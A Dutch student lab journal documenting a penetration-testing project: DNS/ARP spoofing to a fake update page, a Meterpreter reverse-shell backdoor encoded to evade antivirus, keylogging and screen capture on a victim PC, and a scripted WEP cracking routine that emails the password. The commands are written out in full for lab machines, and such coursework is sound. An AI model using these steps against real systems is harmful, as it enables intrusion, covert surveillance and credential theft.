Nu dacht ik er ineens aan dat ik niet de juiste versie .NET heb. In feite was .NET niet geïnstaleerrd (ik dacht dat dit standaard was vanaf Win XP). Na dit te installeren, werkte de exploit nadat je manueel de site bezocht waar deze opstond (192.168.2.7).

Volgende keer:
* DNSspoof, automatisch naar "gehackte" site gaan.
* Andere exploit die niet enkel IE treft.
* Mailscript!?

#02/01/2016

Doel van vandaag is om via een backdoor de controle te kunnen overnemen van ons victim. We zullen dit doen via Metasploit. Ook willen we dat de hack werkt in alle browsers (niet zoals vorig keer enkel IE).

Hoe gaan we dit doen? We zullen via een DNS spoof wijsmaken dat elke hostname zich bevind op het ip adres van de hacker! Dit doen we door middel van een MITM (Arp spoof). Elke keer de victim vraagt waar bevind google.com, facebook.be, ... zich antwoorden we dus. 

Tegelijk hosten we een website op de hacker (Kali PC), deze zal de victim zien op elke "site"! Op deze site zetten we een valse waarschuwing over niet up ge date systeem! We maken hem wijs dat we uit voorzorg de internettoegang ontzegd hebben. We bieden een update die zogezegd een oplossing biedt, maar eigenlijk is het een kwaadaarige payload met een backdoor in :)

We hebben dit eerst geprobeerd met MITMf, die zou ook een DNS spoof module moeten bevatten. [Dit is een blogpost](http://sign0f4.blogspot.be/2014/07/mitmf-update-spoof-plugin_23.html) die geschreven is door de maker van MITMf. Volgens mij is het gewoon verrouderd, want uiteraard werkt dit niet... Getest op apt-get versie en met de laatste versie op GitHub.

Heb ik maar besloten op Ettercap te gebruiken. We hebben nu geen nood om HTTPS te omzeilen. We gaan immers geen bestaande sites bezoeken. En we vallen een Windows XP computer aan met Firefox 12 / Internet Explorer 8. Dus geen nood om HSTS te omzeilen!

We hebben een paar tuturials gevolgd maar uiteraard werkte er enkele. [Deze video](https://www.youtube.com/watch?v=5xoFFIcUaIA) is diegene met de beste uitleg, staan enkele fouten in zoals de instellingen van etter.conf zijn niet nodig. Deze zijn enkel nodig wil je dat de victim nog de sites kan bezoeken, bij ons is dit niet nodig we serveren onze eigen site. 

Het grootte probleem was dat ik niet beschikte over het etter.dns bestand. Ik dacht geen probleem het niet dat ik het ging gebruiken (alles moet naar mijn computer, er moet dus maar 1 DNS entry in). Maar na alles juist in te stellen werkte het uiteraard niet.

Dan heb ik besloten om Ettercap te gebruiken via de terminal. Maar al snel was duidelijk dat de meeste tuturials out dated waren, commando's die niet meer werken of anders moesten gebruikt worden...

Ik ben ondertussen de tel kwijt geraakt hoevaak "werkende" tuturials niet werken bij ons. Blijkbaar is documentatie en compatibiliteit met oudere versies houden niet zo belangrijk. Ik (Brecht Carlier) was van plan hierover te bloggen, maar ik ben dit gewoon niet meer van plan. Als iemand binnen een jaar mijn post leest, is hij waarschijnlijk totaal niet meer correct....

Ik heb hierna besloten Ettercap te verwijderen *apt-get remove ettercap-common* om hierna terug te installeren *apt-get install ettercap-common*. Het resultaat de grafische versie van ettercap werkt niet (start niet meer op). Maar geen probleem we waren ervan overtuigd dat het wel ging werken als we de laptop herstarten. Bleek jammer genoeg niet het geval te zijn. Na nog talloze apt-get commando's begon de moed in onze schoenen te zaken. Toen heb ik besloten om via de source code ettercap (GitHub) ettercap te installeren. Er gebeurde iets toen we het opstarten maar daarna had ik nog nooit zoveel errors op één scherm gezien.

We waren het zo beu dat ik gewoon mijn laptop heb uitgezet. We hebben verder gedaan via Virtualbox. Daar hadden we wel al de etter.dns file staan, onze hoop steeg. Na alles juist te doen, werkte het nog steeds niet.

Na 5u verder hebben we letterlijk niets bereikt. We besluiten om even te stoppen dit gaat toch niet verder zo....

Mijn volgende plan was om gewoon volledig Kali opnieuw te installeren op mijn laptop. En ook ineens goed. Alles wat op mijn laptop stond (Windows 10, Windows Server 2012 R2, Linux Mint, Kali) heb ik verwijderd. En enkel Kali opnieuw opgezet. Alles terug geconfigureerd (taal, toetsenbord, ...)  en we waren terug up and running. Alles werkt terug normaal buiten de print screen toets.

Als eerste MITMf terug opnieuw geïnstalleerd (dit moet uiteraard eerst terug werken). En daarna alle stappen van Ettercap opnieuw uitgevoerd. Wonder boven wonder begonnen dinges te werken. Ik gebruikte eerst de standaard etter.dns file. Deze zal indien het IP adres van microsoft.com gevraagd wordt het IP doorsturen van linux.org (trololo). Wat er nu eigenlijk verkeerd was al dit tijd, we hebben geen idee.

Daarna hebben we de etter.dns file aangepast dat elke hostname zich bevind op onze Kali computer:

>\*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.2.18

Nu voor we dit konden uittesten, moesten we uiteraard een webserver hebben draaien op onze Kali computer. Uiteraard doen we dit met apache!

> sudo service apache2 start

Nu onze webserver opstaat, passen we de index.html file (/var/www/html/) aan naar onze eigen wensen. We verzinnen een tekst, en voegen een download link toe. Voorlopig laten we deze even naar niets wijzen (href) we hebben onze backdoor nog niet gecreëerd. We testen de site door te surfen naar localhost op onze hacker (Kali). Het ziet er goed uit. Ik test even de site manueel op de Windows XP computer (surfen naar 192.168.2.18). Dit werkt ook.

We voeren ons DNS spoof aanval uit. Eerst dus ARP spoofing opzetten. Even verfieren of dit werkt op de Win XP computer d.m.v. arp -a. Alles werkt normaal ik ben instaat om pakketjes te sniffen (ik zie een dhcp pakketje voorbij komen en wat achtergrond http verkeer). Ik zet de dnsspoof plugin op. Ik flush voor de zekerheid de dns cache op de WinXP computer. En surf dan naar microsoft.com en ja hoor daar staat hij onze eigen mooie site! 

Er is nog een klein probleempje, als je bijvoorbeeld zoekt met google wordt de url aangepast met een zoek query. Deze url bestaat niet op onze server. Daar staat enkel een index.html pagina op. We moeten nog instellen dat als de site niet gevonden wordt op mijn server dat hij automatisch geredirect wordt naar de index.html pagina.

Dit heb ik gedaan d.m.v. [fallbackresource](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#fallbackresource). Dit kun je instellen in je apache settings.

> FallbackResource /index.html

Dit heb ik toegevoegd onder *DocumentRoot* in 000-default.conf in /etc/apache2/sites-available.</br>
Zo dit probleem is ook opgelost. Het maakt niet uit wat je invuld, je komt altijd terecht op onze website. Deel 1 van het plan is geslaagd.

Nu was het tijd voor Metasploit. We zullen gebruik maken van de *reverse_tcp exploit*. Deze exploit zal zorgen dat er een 'reverse connection' opgesteld wordt. Normaal verbind en client naar een server via een bepaalde poort. Een firewall zal het binnenkomende verkeerd vanaf die poort in de gaten houden en a.d.h.v. regels wordt er bepazld of het toegestaan of niet toegestaand is. Bij en 'reverse connection' zet je zelf een poort open en zeg je tegen de server verbind maar op deze poort. Omdat een firewall meestal enkel naar inkomend verkeer kijkt, wordt deze poort niet in de gaten gehouden. Vanaf er nu verbinding is gemaakt met een remote computer (server) zijn we eigenlijk instaat commando's door te sturen (Meterpreter). Kort gezegd slaagt dit dus gewoon op wie de sessie start! En we doen dit om routers / firewall settings te omzeilen. Je zult later ook zien dat we dus met onze hacker (Kali) zullen moeten wachten tot de victim verbinding probeert te maken met ons.


We moeten deze exploit in een uitvoerbaar bestand steken, we zullen dus een .exe genereren.

> use windows/meterpreter/reverse_tcp </br>
> set LHOST 192.168.2.18 </br>
> generate -e x86/shikata_ga_nai -i 30 -t exe -f win32update1536.exe

De '-e' staat voor enconding, d.m.v. de '-i 30' specifieren dat we de .exe 30 keer encoderen. Zo wordt de exploit moeilijker vindbaar voor virusscaners. Tegenwoordig (vanaf +- 2010, tijd gaat zo snel) zal dit niet meer voldoende zijn. Je kunt echter wel een paar lagen van ecnyptie toevoegen aan het bestand. We hebben dit niet gedaan, maar er zijn hier genoeg tuturials te vinden op het internet.

De *"-t echo"* specifiert dat er een .exe moet uit komen. We geven onze backdoor een naam dit doen we d.m.v. *'-f win32update1536.exe"*.

We hebben geen poort ingesteld, dit betekend dat we gebruik maken van de standaard poort 4444. Je kunt trouwens zien bij elke backdoor welke informatie verplicht moet ingesteld worden d.m.v. het commando *"info"*. Bij ons was enkel LHOST verplicht (eigen IP adres van de hacker).

Bron:
- [Forum met uitleg](https://evilzone.org/tutorials/metasploit-payload-tutorial/)
- [Officiële documentatie](https://www.offensive-security.com/metasploit-unleashed/generating-payloads/)

Nu we onze backdoor gemaakt hebben (ons gegeneerd .exe bestand) plaatsen we deze in de /var/www/html/ map. We vullen als path voor onze link (href) de naam van de backdoor in. Wij hebben deze win32update1536.exe genoemd. Indien je nu klikt op de link zal je de file downloaden.

We moeten nu onze metasploit zo instellen dat we luisteren naar onze backdoor. 

> msfconsole </br>
> use explout/multi/handler </br>
> set PAYLOAD windows/meterpreter/reverse_tcp </br>
> set LHOST 192.168.2.18 </br>
> exploit


Ik heb geen poort ingesteld omdat we de standaard poort gebruikt hebben (4444). Vanaf nu luisteren we naar binnenkomende response van onze backdoor. We wachten dus tot iemand de file download.

Ik test het uit. Je ziet dat de metasploit console reageert, maar hij kan geen meterpreter sessie starten. (Niets gaat van de 1ste keer). De fout was zeer bizar. De sessie starte maar stopte een paar minuten later van een timeout (EOFError). Ik kon maar één link vinden met een gelijkaardig probleem [LINK](https://community.rapid7.com/thread/2796). Maar de suggesties loste het probleem niet op.

![Error](http://i.imgur.com/v4dnrQV.jpg)

Na een paar keer proberen had ik een andere "error". Hij bleef hangen op "sending stage metasploit"... Dit probleem kwam frequenter voor op google. Maar ook hier vond ik niets dat van toepassing is van mijn probleem. Na een paar keer proberen werkte het uit het niets ineens. (Kali dacht waarschijnlijk dat ik tijd teveel heb). Ach ja ik mag niet klagen het werkt! We hebben een meterpreter sessie!

![Meterpreter](http://i.imgur.com/tIUmhxs.jpg)

Zo vanaf nu kunnen we alles wat we met metasploit kunnen, uitvoeren. Het eerste wat je best doet is de backdoor "verplaatsen" naar een andere .exe (migrate). Zie gast sessie (Ernst & Young). Je zorgt er best ook voor dat je de backdoor automatisch wordt uitgevoerd nadat Windows herstart wordt, anders moet hij de file terug downloaden voor je toegang kunt krijgen.

We hebben hierna wat rond gespeeld met Metasploit. Wat basis commando's:
* download => Bestand downoaden op victim
* getuid => Kijken als welke "gebruiker" onze backdoor runt
* ipconfig => ipconfig uitvoeren op victim
* ps => "Taakbeheer", kijken welke programma's er uitgevoerd worden op de victim
* webcam_snap => Foto nemen via webcam. Kreeg de drivers niet werkend op Windows XP (jammeeuuurr)

Voor nog meer basis commando's: [KLIK HIER](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

We hebben ook nog printscreen genomen van de victim, zo kunnen we constant zien wat de gebruiker doet. Ook hebben we een keylogger toegevoegd aan onze backdoor. Nu kunnen we ook zien wat de gebruiker constant invuld!

##### Demos

Taakbeheer van victim:

![Metasploit ps](http://i.imgur.com/7KGXznM.jpg)

[Keylogger Metasploit YouTube Demo](https://youtu.be/nEx2FmDNysE)

[Screen capture Metasplout YouTube Demo](https://youtu.be/NxHErjcZU7U)

Vanaf we een meterpreter sessie hebben zijn de mogelijkheden ontelbaar! De victim is een vogel voor de kat. We kunnen hem lid maken van een botnet, logingegevens stellen, windows kapot maken, alles lezen wat hij kan lezen, ...

### Geleerde commandos
Bestanden zoeken (zoek naar etter.dns)
> locate etter.dns

# 08/01/2016

![Foto](http://i.imgur.com/XJ8zVYU.jpg)

## Putting it all together!
Vandaag is de laatste dag dat we echt extra's gaan toevoegen! We hebben bijna een volledig dag de tijd. Het project wordt vandaag gefinaliseerd!

## WiFi script
We hebben dit nog gefinetuned. Het was ook de eerste keer dat we dit script testen op onze 'nieuwe' Raspberry Pi (Aka Brecht's laptop).
Er moest nog gezorgd worden dat we onze gegeneerde log met IV's na x aantal tijd gebruikt wordt om het wachtwoord te kraken.

Voorlopig deden we deze stap altijd handmatig.
Dit omdat het op onze Raspberry Pi geen vaste tijd op geplakt kon worden voor we aan minstens 10000 data pakketjes gecaptured hadden.
Bij de laptop ging dit merkbaar sneller (waarom leest u verder), en waren 2 minuten wachten meer dan voldoende!

We hebben eerst alle files van vorige sessies verwijderd. Zo zijn we 100% zeker dat we het wachtwoord kraken van deze sessie. 
We starten onze hack op (aireplay, airodump, ...).

Hierna wachten we dus twee minuten (sleep 120) en beginnen dan aan aircrack-ng. We vangen de output van dit commando via 'Tee' (lees verder wat dit is). En schrijven dit naar een file 'password.txt'.
Het groote probleem is dat onze geopende venster die de data aan het 'vangen' zijn, op blijven staan. We weten niet hoe we deze moeten sluiten vanuit ons script.
Het is belangrijk dat je deze elke keer sluit voor je aan een nieuwe hack sessie begint!

Nu roepen we ons email script aan (zie volgende paragraaf)!

### Tee?
'Tee' is een functie in Linux waarbij je de output van je executable (script, programma, ...) kunt schrijven naar een file. Hoe doet 'Tee' dit?

> ls -l | tee output.txt

ls -l is ons programma dat schrijft naar stdout (uitgang 'UI' -> Scherm, SSH sessie, ...). Tee "vangt" deze uitgang en zal deze schrijven naar de file output.txt. Indien gewenst kan dit ook nog verder gestuurd worden naar een stdin (input). De file wordt trouwens elke keer overschreden!

'|' is trouwens het 'pipe' symbool. Piping is een belangrijk concept in de Linux wereld. Piping is eigenlijk het doorsturen van data. Je vangt de output van een bepaald commando en stuurt het ineens door naar de input van een ander commando! En makkelijk voorbeeld is:

> \# cat /proc/cpuinfo | grep -i 'Model'.

Je zult het 'grep' commnado direct uitvoeren op de output van het 'cat' commando! Dit laat trouwens de modelnaam van je CPU zien!

### Oplossing!?
Toen we onze opstelling aan het bouwen waren, was ik (Brecht) vergeten de antenne erop te draaien (we maakten voor de verandering eens gebruik van mijn groote antenne). We hebben dit nooit doorgehad.

Nadat we besloten te pauzeren viel het me ineens op dat de antenne er gewoon naast lag. Ik heb ze erop gedraaid en we vonden direct veel meer SSID's (rond de 15 keer AP Wifi / Eduroam, hiervoor was dit max 3 van elks)...

We testen ons script nog eens en het viel direct op dat de gevangen data veel trager optelde. Het probleem waar we al weken met sukkelden. Ik draai de antenne er terug af en de snelheid waarmee we data vangen wordt ineens een pak groter!

We hebben dus een omgekeerd evenredig verband tussen signaal sterkte en 'data vangen'. Dit is zeer raar. Onze enigste verklaring is dat we zoveel access points ontvangen dat het dus moeilijk wordt... </br>
We zijn zelf ook niet zeker, het is een raar fenomeen maar het gebeurd. Hier zouden we eigenlijk eens meer onderzoek achter moeten doen. Maar het project is zo goed als afgelopen. Ondanks zijn we blij dat we dit ontdenkt hebben, dit zal de live demo zeker versnellen!

## E-mail
We moesten er nog voor zorgen dat we een e-mail zonden vanaf we een password gevonden hadden van de WiFi.
We zijn eerst opzoek gegaan naar python script op het internet. We vonden verschillende repo's met mail scripts. 
Een paar hievan hebben we getest, zonder succes. Op aanraden van Arne Schoonvliet en Bart Kerstens hebben we gewoon het script van vorig jaar gebruikt.
En inderdaad dit script was zeer eenvoudig geschreven en werkte zeer gemakkelijk! We moesten enkel nog een eigen email adres maken voor onze RPi (Email: penpi2.tinnebrecht@gmail.com).

We moesten het nog enkel aanpassen dat het niet het IP adres stuurt maar ons gekraakt wachtwoord. We doen dit door een ons gegeneerd bestand (password.txt) te openen in Python. En de content die hierin staat te verzenden.

> file = open('password.txt', 'r')
> msg = MIMEText(file.read());

We doen dit dus zo, we hebben nu de tekst die in onze file stond in de variable msg staan. Nu zijn we instaat omdit door te sturen via mail. Voor verdere uitleg verwijs ik naar het script, dit is volledig uitgelegd met commentaar.

## Test Echo Test
Voor de dag om is testen we nog snel een paar zaken die we waarschijnlijk gaan demo'en.

* WiFi script werkt
* MITMf werkt
* HTTPS omzeilen werkt
* Wachtwoorden vinden (webwachtwoorden).

# 14/01/2016
De dag voor de presentatie. We willen nog eens alles testen...

De adapter van de Phillips router zijn we kwijt, dit komt doordat we verhuisd zijn van het projectlokaal naar het feitelijk labo. Grootste fout die we gemaakt hebben, eenmaal aangekomen in het labo was het er zo druk dat we eigenlijk niets meer gedaan hadden (3 klassen in de 01.07). We hadden gewoon moeten blijven zitten...

Zoals we al een vorige keer besloten hebben, gebruik ik mijn thuisrouter de E4200 van Linksys. Een redelijk recente router met DD-WRT op. Dit heeft als voordeel dat we deze ook kunnen gebruiken op 'internet te verdelen'. Echter werkt ons hack script hier niet op. We worden automatisch gedeauth. Voordat dit gebeurde merkte ik nog wel een bug in ons script.

> xterm -e "airodump-ng -c $CHANNEL -w $SSID --bssid $BSSID $IFACE" &

De SSID van mijn thuis netwerk ik "Wireless Carlier". Merk de spatie op. Indien we de voormalige regel gebruiken wordt mijn SSID als 2 aparte woorden gezien! En crasht ons script (natuurlijk krijg je geen errors, het loopt gewoon door zonder iets melden, het zal gewoon niet werken...). Opgelost door simpelweg aanhalingstekens toe te voegen!

> xterm -e "airodump-ng -c $CHANNEL -w '$SSID' --bssid $BSSID $IFACE" &

Daar lossen we ons probleem niet met op. Ik heb thuis elke adapter die ik maar kon vinden geprobeerd. Diegene van mijn thuisrouter was niet dezelfde. Die van mijn Belgacom modem wel. Alleen zitten we dan zonder internet en zonder tv. Vooral het internet had ik nodig. Heb ik maar besloten om een nieuwe adapter te gaan kopen in de Mediamarkt. Daar hadden ze diegene die ik nodig had. Hij koste €40 euro maar ik had niet veel keuze. Ik kon er een nieuwe WiFi router voor kopen maar ik was dan nooit 100% zeker of die ging werken met ons hackscript. Gelukkig was dit een universele adapter met verschillende spanningsniveau's ik kan hem dus zeker nog voor iets anders gebruiken.

We hebben het nu terug getest en alles marcheert terug. Het enigste wat niet goed was is dat je het MAC adres van je draadloze adapter moet invullen, dit moet beter kunnen. We geven als parameter immers mee welke interface er gebruit moet worden. We hebben dit nog snel even geautomatiseerd.

> CMAC=$(ip link show $IFACE | tail -n 1 | cut -f 6 --d " ")

We halen het mac adres nu gewoon uit een commando. Dit commando is bijvoorbeed:

> ip link show wlan1
> 3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DORMANT group default qlen 1000
    link/ether 60:36:dd:99:ca:37 brd ff:ff:ff:ff:ff:ff

We verwijderen nog de gegevens die we niet nodig hebben d.m.v. het ['cut' commando](http://www.computerhope.com/unix/ucut.htm). We willen echter alleen knippen op de 2de lijn van de output van het commando. Dit doen we d.m.v. tail -n 1. Onze 'cut functie' gebruikt een spatie als delimiter. En we hebben het 6de resultaat hiervan nodig (noot: er staan 5 spaties in het begin van de 2de lijn)  Resultaat:

> 60:36:dd:99:ca:37

Nu moesten we dit MAC adres nog opslagen in onze variable CMAC. Één van de manieren waarop we dit konden doen was via het dollarteken ($). We plaatsen ons commando tussen haaken en plaatsen het dollarteken ervoor. D.m.v. en echo even snel getest en inderdaad ons mac adres van de juiste interface is nu opgeslagen in de variable!

Ons script is nu af, buiten nog wat commentaar toevoegen. We hebben er even een filmpje gemaakt.

[YouTube demo](https://youtu.be/rsrM9N1Z138)

Het einde staat er jammer genoeg niet op maar in de mail staat wel degelijk het wachtwoord! Morgen zien jullie het live tijdens onze presentatie!


## Brecht Conclusie
Ik ben blij dat we toch iets toonbaar hebben kunnen tonen! Dit is echt het project waar we veruit het langst hebben vast gezetten! Zolang dat de moed echt in onze schoenen was gezakt. Maar opgeven is geen keus, we hebben nog fanatastische resultaten gehaald. Ik ben vooral onder de indruk van het omzeilen van HTTPS! Zonder HSTS (waar ik zelf nog nooit van gehoord heb) is het echt kinderspel als je een MITM kan uitvoeren. Met HSTS wordt het moeilijker maar nog steeds niet onmogelijk. Ik let er nu zeker vaker op of de site wel via HTTPS geladen is!

WiFi kraken was ook fantastisch leuk, jammer dat het enkel op een verouderde wireless router ging maar dicht bij mij in de buurt hebben nog 2 buren WEP. Dus nog steeds niet nutteloos geweest.

Het allerbeste blijft toch 'Meterpreter'. Vanaf je toegang hebt, begint de pret pas! De ontelbare zaken die je dan kunt doen is onvoorstelbaar!

Ik heb ook hard gemerkt dat mijn Linux kennis ondermaats is. Ik moet toegeven ik begin er wel de fun van in te zien. Simpele commando's waar je veel mee bent (cut, grep, tail, tee, ...) kunnen je het leven wel makkelijker maken! Maar toch de problemen die we hebben gehad met onze RPi en andere talloze moeilijk problemen zorgen er toch voor dat de security wereld niet iets is wat ik mijn hele leven zou kunnen doen. Maar als hobby zou ik het nog wel aanraden :)

Ten slotte is het wel leuk en zeker de resultaten zijn leuk! Niet iedereen kan zeggen dat hij WiFi wachtwoorden kan hacken of FaceBook, Mircosoft, Blackboard wachtwoorden zou kunnen achter halen!

Ik wil ook niets iets kwijt over de les. Ik vond een paar zaken jammer. Het is in het begin van het project duidelijk vermeld dat er geen Alfa's naar huis meegebracht mogen worden. Ik heb dan direct besloten er 2 te kopen. Ik moet er thuis aan kunnen werken! Nu blijkt dat eigenlijk in de praktijk veel mensen die van het school mee naar huis deden, vragen was allemaal niet nodig... Ik had sowieso een Alfa nodig voor privé doeleinden. Maar ik had liever er mee gewacht tot ik op het bot kon zoeken welke ik nodig had (er zijn er immers zeer veel). Ik heb er nu meer als 3u research in gestoken en heb misschien wel de verkeerde gekocht...

Ook vond ik het echt jammer (vooral onbegrijpbaar) dat we niet mochten blijven zitten in de project lokalen tijdens het labo van INF_SEC. We hadden die dag altijd 3u springuur. Dus stelden we ons hier volledig op. En onze opstelling was groot. Dat we daar niet mochten blijven zitten snap ik maar dat we dan in een lokaal moeten zitten waar het zo rumoerig is (2 / 2+ klassen) en mensen kinderachtig doen. Snap ik dan weer niet. Vooral er waren er veel die niets voor INF_SEC aan het doen waren maar die stonden dan op aanwezig, en wij die echt hard aan werken waren waren dan onafwezig. Ik ben blij dat in onze nieuw gebouw er zo'n project lokalen waren. We hebben hier super hard in gewerkt en de druk om te presteren lag hoog. We zaten immers met 2 à 3 groepen!

Als laatste wil ik zeker nog iets kwijt over Tinne. Ik ben meer dan te tevreden over Tinne haar werk. Ik durf zelf te stellen dat Tinne meer voorbereiding heeft gedaan dan alle andere partners waar ik mee heb samengewerkt dit semester te samen (buiten Matthew). Ik genoot er echt van hoeveel moeite ze heeft gedaan om zaken op te zoeken! Ook heb ik dankzij haar de kunst van documenteren ontdekt! In groepswerk is dit zeker belangrijk, en dankzij Tinne heb ik  er extra opgelet! Ook haar motivatie was zeer hoog. Zij is de enigste partner die tijdens de vakantie meer dan 1 keer is samengekomen om samen eraan te werken (zelfs 3 keer!). Kortom ik ben echt gelukkig met een partner zoals Tinne! Ik denk als ze zo gemotiveerd blijft ze verder geraakt als sommige mensen denken! Bedankt Tinne!

## Tinne Conclusie
We hebben tijdens dit project enorm veel tegenslagen gehad. Daarom is het eens zo leuk om toch iets af te kunnen leveren dat werkt. 
Ik ben blij dat we in het begin dit project gekozen hebben. Ik heb er heel veel uit geleerd. Mijn linux kennis was zeer miniem om het nog licht uit te drukken. Ik kan niet zeggen dan mijn kennis van linux nu wel goed is, maar ik heb zeker wel veel bijgeleerd.

De keren dat iets werkte was het ook super leuk. Zo van die dingen zoals wachtwoorden van facebook te weten komen, kan niet zomaar iedereen. Dat maakt het net zo leuk, omdat het ons dan net wel lukt. Ik vind het jammer dat we niet met de nieuwste materialen konden werken omdat op de meeste bescherming gekomen is. Er zijn echter nog steeds mensen die gebruik maken van WEP of een te oude versie van firefox gebruiken dus is alles zeker niet voor niets geweest. Deze opdracht heeft me wel doen inzien hoe gemakkelijk het soms kan zijn om stoute dingen te doen.

**Samenwerking**
Ik had in het begin een beetje schrik om met Brecht samen te werken, wegens groot niveau verschil. Uiteindelijk ben ik blij dat ik het toch gedaan heb. Ik heb van Brecht geleerd om door te zetten en niet op te geven. Iets dat ik in het verleden soms iets te snel deed. Ik vond het altijd heel leuk om met Brecht samen te werken. Ondanks dat we beiden wisten dat Brecht alles beter kan en meer weet, luisterde hij toch altijd naar wat ik te zeggen had. Moest ik de kans krijgen om dit project opnieuw te beginnen zou ik direct terug voor Brecht kiezen.


## Einde
De bedoeling was dat je leerde samenwerken in groep en leerde plannen. Dit als voorbereiding voor onze bachelor proef in het volgende semester. Verder was dit ook een onderzoek naar het ontdekken van de Linux /Kali / Security wereld. We kunnen concluderen dat dit onderzoek zeer interessant was. Omdat we in groep werkten was het belangrijk dat we een goede taakverdeling hadden. Er mag geconcludeerd worden dat we dit goed gedaan hebben. We hebben een toonbaar project gemaakt, we zijn zelf blij met het resulaat. We mogen hier zeer trots op zijn! Verder was het ook een zeer leerrijk proces. Ééntje met up's en vooral veel downs, iets wat ieder project wel eens heeft. We hebben leren werken met Kali en onze hacking tools daar successvol in kunnen opbouwen. Ook hebben we geleerd dat je eerste en ook je tweede en derde idee niet steeds het beste idee is en dat je moet durven veranderen. De stap naar de laptop was gewaagd maar in functie van het project was het uiteindelijk een zeer goede beslissing! We willen ook graag lector T. Dams en M. Luyts bedanken voor de hulp als we die nodig hadden. Hun ervaring heeft ons zeker af en toe geholpen. Het was een leerrijk proces en we kijken uit naar onze bachelor proef.

We willen toch nog eens M. Luyts extra bedanken om ons te helpen bij ons bash script, zonder zijn kennis van Linux had het misschien niet gelukt. We zijn hier zeer dankvol voor! We wensen je veel succes met je verdere jaren op AP!!!

Tinne Van den Abbeele en Brecht Carlier
